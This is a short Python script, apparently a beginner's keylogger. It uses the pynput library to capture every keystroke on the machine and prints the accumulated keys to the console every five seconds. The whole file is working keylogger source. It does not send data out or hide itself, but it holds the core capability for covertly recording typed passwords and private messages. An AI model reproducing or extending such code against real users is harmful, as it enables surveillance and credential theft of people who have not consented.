import pynput
import threading

log = ""       

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

def report():
    global log
    print(log)
    log = ""
    Timer = threading.Timer(5, report)          # we are making a thread called timer and we are setting time of 5 seconds after which the thread will call its own function
    Timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()